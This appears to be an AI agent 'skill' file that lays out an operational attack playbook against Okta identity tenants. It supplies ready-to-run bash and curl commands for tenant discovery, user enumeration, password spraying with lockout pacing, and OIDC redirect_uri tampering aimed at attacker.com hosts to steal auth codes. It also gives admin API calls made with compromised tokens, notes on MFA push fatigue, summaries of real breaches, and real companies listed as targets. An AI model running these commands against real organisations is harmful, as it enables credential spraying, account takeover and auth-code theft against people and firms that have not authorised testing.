---
name: okta-attack
description: "Okta-as-IdP attack methodology — tenant discovery, user enumeration vectors, authentication flow analysis, factor enumeration, password spray with lockout discipline, push-notification fatigue, OIDC redirect_uri tampering, SAML SP misconfiguration, admin API post-compromise, FastPass abuse, disclosed incidents (LAPSUS$, HAR-file leak, Scattered Spider, bcrypt bypass). Use when target uses Okta for SSO/IdP (*.okta.com, *.okta-emea.com, *.oktapreview.com)."
---

## When to use this skill

Trigger when:
- DNS shows `<tenant>.okta.com` or `<tenant>.okta-emea.com` (EMEA region)
- Login flow redirects to `<tenant>.okta.com/login` or `/app/<app_id>/sso/saml`
- Web pages reference `/signin/customize`, `oktapreview.com`, or `auth-js-sdk`
- Recon notes "uses Okta for SSO"
- A target has `*.okta.com` SAN in TLS cert
- Identity-fabric mapping returns Okta as IdP for a corporate app

DO NOT use for:
- Entra ID (use `m365-entra-attack` instead)
- Google Workspace (different attack surface)
- ADFS (different protocol, on-prem)

---

## Tenant discovery

### Direct guesses
```bash
for tenant in target-brand target-brand-ltd target-sister-brand target-brand-short target-other-variant; do
  for region in okta okta-emea oktapreview; do
    host="$tenant.$region.com"
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://$host/")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $host  $code"
  done
done
```

### Cross-ref from DNS
```bash
for domain in client.example client-ltd.example; do
  dig +short "sso.$domain" CNAME
  dig +short "login.$domain" CNAME
  dig +short "auth.$domain" CNAME
  dig +short "okta.$domain" CNAME
done
```

### Cross-ref from app HTTP flow
```bash
curl -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"
# If redirects to <something>.okta.com → confirmed Okta tenant
```

---

## User enumeration

### Method 1 — `/api/v1/authn` differential
```bash
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<email>","password":"_test_invalid_pw"}'

# Response codes:
#   401 + "errorCode":"E0000004" → invalid credentials (user exists OR doesn't — Okta unifies these)
#   401 + "errorCode":"E0000119" → account locked
#   200 → MFA prompt (cred VALID, MFA needed)
#   200 + "status":"SUCCESS" → full auth (rare in modern setups)
```

Okta has hardened against direct user-existence enum via `/api/v1/authn` — error message is typically uniform "Authentication failed". User enumeration via this endpoint is unreliable in 2024+.

### Method 2 — Sign-in widget JS endpoint
```bash
curl -sk "https://<tenant>.okta.com/api/v1/sessions/me" \
  -H "Accept: application/json"
```

### Method 3 — OIDC `/v1/authorize` with login_hint
```bash
curl -skI "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<id>&response_type=code&scope=openid&redirect_uri=https://example.com&login_hint=<email>"
# Different redirect → user exists vs doesn't
```

### Method 4 — Org-specific identifier probing
Test pattern guesses: `firstname.lastname@target.com`, `flastname@target.com`, `employeeID@target.com`

---

## Authentication flow analysis (always do this first)

```bash
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
  -H "Content-Type: application/json" \
  -d '{"username":"<valid_user>","password":"_test_invalid_pw"}' | python3 -m json.tool
```

Response structure reveals factor configuration:
```json
{
  "stateToken": "00ABC...",
  "status": "MFA_REQUIRED",
  "_embedded": {
    "factors": [
      {"factorType": "push", "provider": "OKTA"},
      {"factorType": "token:software:totp", "provider": "OKTA"},
      {"factorType": "sms", "provider": "OKTA"},
      {"factorType": "call", "provider": "OKTA"},
      {"factorType": "email", "provider": "OKTA"},
      {"factorType": "question", "provider": "OKTA"},
      {"factorType": "webauthn", "provider": "FIDO"}
    ]
  }
}
```

**Critical insight:** the factor list reveals phishing-resistance:
- `webauthn` (FIDO2) — phishing-resistant
- `question` (security questions) — extremely weak; KBA attacks
- `sms` / `call` — phishing-able (SIM swap, push fatigue)
- `push` — phishing-able via MFA fatigue
- `email` — phishing-able if attacker has email read access
- `totp` — phishing-able via AiTM

---

## Password spray (with Okta-specific lockout discipline)

### Lockout policy
Okta default: **10 failed sign-ins → lockout** (configurable per-org). Some orgs configure much stricter (3 fails).

Discipline:
- ≤2 attempts per user lifetime per engagement
- Track per-user in atomic state file
- Stop on first valid hit OR if LOCKED rate exceeds threshold

### Status codes to watch for
| Response | Meaning |
|---|---|
| `200 status=MFA_REQUIRED` | **Password is VALID** — MFA challenge waiting |
| `200 status=SUCCESS + sessionToken` | Full auth (only if MFA not required) |
| `200 status=PASSWORD_EXPIRED` | **Password is VALID** but must change |
| `200 status=LOCKED_OUT` | Account locked (pre-existing or our cause) |
| `401 E0000004` | Authentication failed (user doesn't exist OR wrong password) |
| `401 E0000119` | User is locked |
| `429` | Rate-limit hit |

---

## Push-notification fatigue (MFA bombing)

If a valid password is obtained and `push` factor is available — the classic attack: hammer the push factor until the user accepts out of fatigue.

**OUT OF SCOPE in most red-team engagements** (counts as social engineering). Document the vector existence but do not execute without explicit sign-off.

---

## OIDC redirect_uri tampering

```bash
curl -sk "https://<tenant>.okta.com/.well-known/openid-configuration" | python3 -m json.tool

for ruri in \
    "https://attacker.example.com/" \
    "https://target.com.attacker.com/" \
    "https://target.com@attacker.com/" \
    "https://target.com#@attacker.com/" \
    "//attacker.com/" \
    "https://target.com/cb?next=https://attacker.com/"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<client>&response_type=code&scope=openid&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$ruri'))")")
  echo "  $ruri → $code"
done
# Any 302 with attacker URL in Location header = open redirect → auth-code theft chain
```

---

## SAML SP misconfiguration check (per-app)

```bash
curl -sk "https://<tenant>.okta.com/app/<app_id>/sso/saml/metadata"

# Look for:
#   AuthnRequestsSigned="false"  ← see hunt-saml for XSW
#   WantAssertionsSigned="false" ← assertion-replay possible
#   <NameIDFormat>...emailAddress</NameIDFormat>
```

---

## Okta Admin API (post-cred-compromise)

```bash
# Test admin endpoints (require valid SSWS token):
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/users"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/groups"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/apps"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/logs"
```

---

## FastPass / Okta Verify abuse

Okta FastPass is push-based + device-bound. Bypasses:
- Device trust spoofing (requires endpoint compromise — internal-only)
- Push fatigue (see above)
- Phishing redirect to fake FastPass prompt

---

## Common Okta tenant configuration patterns

| Indicator | Configuration |
|---|---|
| `<tenant>.okta.com/api/v1/iam/orgs` returns 401 (not 404) | API IAM endpoints enabled — admin attack surface |
| `customize/sign-in` page reachable anon | Tenant brand customization is public — useful intel |
| Multiple `*.okta.com` SAN certs | Multi-tenant org (less common) |
| `oktapreview.com` subdomain | Preview/sandbox tenant — typically weaker security |

---

## Disclosed cases / CVEs / coordinated-disclosure

### 1. Okta + Sitel/Sykes — LAPSUS$ supply-chain breach (Jan 2022)
- LAPSUS$ compromised support engineer's workstation at Sitel. Reached Okta "SuperUser" support tooling for ~25 minutes. 2 customer tenants accessed of 366 originally feared.
- Root cause: Third-party support provider with persistent privileged access, no MFA on VPN account.

### 2. Okta Customer Support HAR-file leak (Sep-Oct 2023)
- Support employee logged into personal Google profile on corp laptop; Chrome sync exfiltrated support-service-account creds. Threat actor downloaded HAR files containing live session cookies → session-replay against 134 customers, 5 had sessions hijacked (BeyondTrust, Cloudflare, 1Password).

### 3. Scattered Spider / Octo Tempest (2022-2024, ongoing)
- Help desk social engineering → MFA reset → Okta Super-Admin → configure attacker-controlled IdP → inbound federation → impersonate any user. Used in MGM/Caesars attacks ($100M+ losses).

### 4. Okta cross-origin auth credential stuffing (Apr-May 2024)
- Customer Identity Cloud cross-origin auth endpoint silently accepted credential-stuffing from unregistered origins.

### 5. CVE-2024-0981 — bcrypt cache-key auth bypass (Oct 2024)
- Bcrypt truncates input at 72 bytes. Username >= 52 chars → password bytes fall past boundary → cache key becomes password-independent. Any password authenticated if cache populated + AD agent unreachable + MFA disabled.

### 6. CVE-2024-10327 — Okta Verify iOS push-response bypass (Oct 2024)
- "Yes, it's me" and "No, it's not me" buttons both returned accept-auth response. User explicitly tapping "No" still approved the auth.

### 7. Varonis Threat Labs — "CrossTalk" + "Secret Agent" (Jan 2023)
- CrossTalk: any tenant admin could issue SMS/email templates delivered to any email/phone via legitimate Okta mailer.
- Secret Agent: SSWS token on on-prem AD-agent decryptable from disk → register rogue AD agent intercepting plaintext credentials.

### 8. Okta admin-console session cookie theft via stealer malware (2022-2024)
- Stealer malware exfiltrates `sid` cookie from `<tenant>.okta.com`. Without IP/device-binding, attacker replays cookie from residential proxy — bypasses MFA entirely.

### Take-aways for hunters
- Attacks rarely hit Okta's product code — they hit **trust relationships around Okta** (third-party support, help-desk verification, federated IdPs).
- Push fatigue is not just social engineering — the iOS bug shows the platform itself can silently approve a denied push.
- Highest-yield post-recon primitives: HAR-file replay, inbound-federation IdP injection, stealer-cookie replay.

---

## Tooling

- **`OktaTerrify`** (github.com/silverhack/OktaTerrify) — post-compromise Okta device-trust / FastPass enumeration
- Build engagement-specific scripts against `/api/v1/*` rather than relying on unverified tools

---

## Anti-patterns

- **DO NOT use Entra-style spray pace on Okta** — Okta's anti-automation is different; rate-limit hits faster
- **DO NOT skip factor enumeration** — knowing the factor list informs the realistic threat model
- **DO NOT assume MFA-fatigue is in scope** — it's social engineering; explicit OK required
- **DO NOT confuse `*.oktapreview.com` with production** — preview is non-prod, findings have different severity

---

## Operator Notes (Battle-Tested)

- No own engagement experience yet — pattern adopted from community research, needs field validation
- Applicable targets: target-corp (xForce, corporate IdP), FIS (enterprise SSO), AS Watson (internal tools)

## Related Skills & Chains

| When | Go to |
|------|-------|
| M365 behind Okta federation | m365-entra-attack |
| SAML assertion manipulation | saml-bypass-techniques |
| OAuth redirect_uri exploit chain | oauth-testing |
| MFA factor downgrade / bypass | auth-bypass-testing |
| Cloud IAM after credential capture | cloud-attack-methodology |
| VPN appliance behind Okta SSO | ssl-vpn-testing |
